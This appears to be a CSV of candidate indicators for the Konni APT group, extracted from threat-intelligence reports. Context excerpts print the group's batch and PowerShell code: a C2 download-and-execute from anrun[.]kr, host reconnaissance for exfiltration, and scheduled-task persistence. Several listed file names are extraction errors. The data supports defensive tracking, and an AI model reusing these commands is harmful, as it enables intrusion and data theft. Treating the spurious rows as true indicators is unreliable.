schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:bca7b089a01a8178eeeeae6866933189413713be3d6dbed20b4b53a7098c60e0,observation--sha256:8566ab56484a9437da96b2a2203a725e7ff3171c175d07e6420aa7f87a9f3e0e,file-name,modif8.doc,modif8.doc,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,modif8.doc,
1.0.0,actor--konni,artifact--sha256:023cd6489fa36e7d01ed5220ba260ce4ce289c78a7c0beb84fec4a697224a99a,observation--sha256:39aed64cc3ceb6524939f1f93e3194004356a2ef22108dca1e0cb3682049e4e0,file-name,mt4managre.exe,mt4managre.exe,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:d172584daa6851dd23423867d50089347de777335b10009609b58015a4f40d93,observation--sha256:d18687e19848b6950da1f8dda81434902b820ec633e9c18e27458046083d57d9,file-name,nulWScript.exe,nulWScript.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:0a70b7e03f59b7554caa747b6de510393b66efb6ee24f3ff71a9616658e096f1,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:cc91137f7439d644012a77e513b4f7aa96bdd45c2b1cf3237cdbe91ebfb87bd6,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:04b5a3ca3b4887b4e03555f78676001ab1be38a9abcd2f192a10c297fa86c3e0,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:7d00719b7262964e653cc7f9cb7350014e55b7256b6c42ef1901127ae9257753,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:df57f7ebb0d0cde22f76e6d5faafaf8eccfcf822fea98953e8200852401eb822,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:b416d9101022f2580a58eb1c6e8b623d414f66605731fcc5e5283758dfc48aaa,observation--sha256:5ced5bd2d90ed7e5a463124746adbe24ebc17d2ece8008d9f65c1908c8cdb107,file-name,pdf.lnk,pdf.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. 통일부조직개편설명자료사칭■[사례B] 전자우편발신지및첨부파일주소분석 ○해당이메일의발신주소지와첨부파일의링크경로를조회해보면다음과같습니다.두곳모두한국의특정도메인과아이피주소가사용됐습니다. 발신지주소 첨부파일주소 도메인 아이피 국가 도메인 아이피 국가 pi.m2comm.co[.]kr 121.254.129.93 KR ddmccic.or[.]kr 116.122.157.24 KR [표3-5] 해킹용전자우편발신지및첨부파일링크정보 ○[사례B] 이메일의발신주소지와첨부파일의링크경로를조회해보면앞서살펴본[사례A] 경우와같습니다. 모두한국의특정도메인과아이피주소가사용됐습니다. ○[사례A] 와[사례B] 가동일한위협배후소행인점을가늠해볼수있습니다. ■202308통일부조직개편설명자료. pdf.lnk ○공격에사용된바로가기( LNK) 유형의악성파일은PDF 문서처럼위장하기위해2중확장자를가지고있고, 다음과같은정보로구성돼있습니다. 파일명 202308통일부조직개편설명자료. p",
1.0.0,actor--konni,artifact--sha256:b416d9101022f2580a58eb1c6e8b623d414f66605731fcc5e5283758dfc48aaa,observation--sha256:3018b39b5ae3097dd0283f387e87a04fb07346ef76b094ceedd82e8973e4033d,file-name,pdf.lnk,pdf.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■[사례B] 통일부조직개편설명자료사칭 ○GSC 는[사례A] 식별이틀후인8월29일화요일에또다른공격을포착했습니다.해당 공격의 경우 현 통일부 장관의 명의를 무단 도용 및 사칭한 점에 비춰 북한의사이버도발과감성이더해졌다고평가됩니다. [그림2-3] 통일부장관명의를사칭한해킹메일화면 ○공격은통일부조직개편설명자료로위장돼있으며, '통일부조직개편설명자료. zip'파일이첨부돼있습니다. 하지만해당파일도전자우편에첨부된형태가아니라, [사례A] 케이스와동일하게국내특정대학교에서위탁운영하는육아종합지원센터로연결돼있습니다. 전자우편에는별도의본문내용이존재하지않습니다. ○ ZIP 압축 파일 내부에는 '202308 통일부조직개편 설명자료. pdf.lnk' 바로가기유형의 악성 파일이 포함돼 있고, 이전 사례와 동일하게 2중 확장자로 위장하고있습니다. 다만, 이번에는XLSX문서가아닌PDF문서처럼가장한것이다릅니다. ○바로가기( LNK) 파일내부에는정상'통일부조직개편설명자료. pd",
1.0.0,actor--konni,artifact--sha256:cca44374c345f3f318e6fe7f0f89d3fa620d2b9a537c094a1295bc8850bfdf2a,observation--sha256:1d842b6ba4a72c646ef48840b2703b1cb3ccccccdded63ab3e0cde161738dec1,file-name,qstopedge.bat,qstopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:549e0255f8bffdd9934c27ad21689e8cc306f706285767009e19efad8d77dc29,observation--sha256:7bff1357973c87183f7a247270fb8177a3abfe4881b4f3543df42266694cd1ac,file-name,qunactivate.vbs,qunactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:299f3698dfb43afb44e421401f5c54018010a83d17c2a64683039bc870cc137e,observation--sha256:51fe11ea3329212957e1a51a4074033fc82feec938250688aafdc855ff374fa4,file-name,qupdate.vbs,qupdate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:02181cdf7b2a415b79c0f905a52c147d6a12c3d46bfbd1aafaa29c386f9d300e,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:6d5d4ea7c3d78be294ad2e0ff3f97d329e13cdbbb0394a14814161d287d76829,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림4-2] 'install.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 27개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'resolvedns.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'activate.vbs' 파일코드분석 ○'activate.vbs' 파일은'resolvedns.bat' 파일에의해호출되는스크립트입니다. 해당스크립트는C2 서버( anrun[.]kr) 에서지정된컴퓨터명(% COMPUTERNAME%) 으로별도 조건에 따라 연결되며, 지정된 환경변수명( ttn) 과 zip 확장자가 결합된'324093.zip' 파일을다운로드하는데사용됩니다. OnError ResumeNext Genians SecurityCenter 21",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:4805d09c8a8e4962562e65aa27080cab33b3ae2d993339819e9e6800b41220c5,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:9ce9112b9b983e530c94599708899188a8c2dae467dc7ca1ef62134c81cc0aa8,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:dec60ed6fe2af9c800936bd634f7c75b4ca89fd69bf3834e176170d5b2f649d6,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:9472a1c359a47c791aceab9da85174a9e54a2f68f6eaa542fc9fa6476e890586,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:8c7aa1d8c8e9ad054c23fd9ebbca0c368ad5a4902b0d1f176fd19547315db75d,observation--sha256:1bee3bcd1905b8e884e4dc851ed8d3d29cab9bbd5674c5a277eb0a2729ee6ee0,file-name,rp-operation-oceansalt.pdf,rp-operation-oceansalt.pdf,candidate,2017-08-01T00:00:00Z,month,known,same-record,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Reference List https://asec.ahnlab.com/ko/1251/ https://blog.alyac.co.kr/2061 https://blog.alyac.co.kr/3014 https://blog.alyac.co.kr/3390 https://blog.alyac.co.kr/3550 https://blogs.blackberry.com/en/2017/08/threat-spotlight-konni-stealthy-remote-access-trojan https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html https://download.ahnlab.com/kr/site/library/Analysis_Report_Operation_Moneyholic.pdf https://e.cyberint.com/hubfs/Cyberint_Konni%20Malware%202019%20Campaig,
1.0.0,actor--konni,artifact--sha256:ae5019ddb7f3021a617c7426267ae0559011b56735428d8e7475170d38dd4663,observation--sha256:f94d79a1ca7f34888afc156759fdf50489788e0e827f6da716b04f21f7d82012,file-name,rshell.exe,rshell.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /kfor /f ""tokens=*"" %ain('dirC:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe/s/b/od') docall %a-windowstylehidden""$SvvZPNyDG=Get-Location;if($SvvZPNyDG-Match'System32' -or $SvvZPNyDG-Match'ProgramFiles') {$SvvZPNyDG='%temp%';};$yeWaKMJy=Get-ChildItem-Path$SvvZPNyDG-Recurse*.lnk| where-object{$_.length-eq0x012F3333} | Select-Object -ExpandPropertyFullName;$SvvZPNyDG=Split-Path$yeWaKMJy;$vwgC8wlBQ=New-Object System.IO.FileStream($yeWaKMJy,[System.IO.FileMode]::Open",
1.0.0,actor--konni,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:54748507d9c49127439936821ac1f11d9b94da8811b790a5931ae85b33812b97,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:e25a41785b87ffb8f3b58890c21da53f0b2b23b45ee5c3e2ab08a4be1730acf3,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
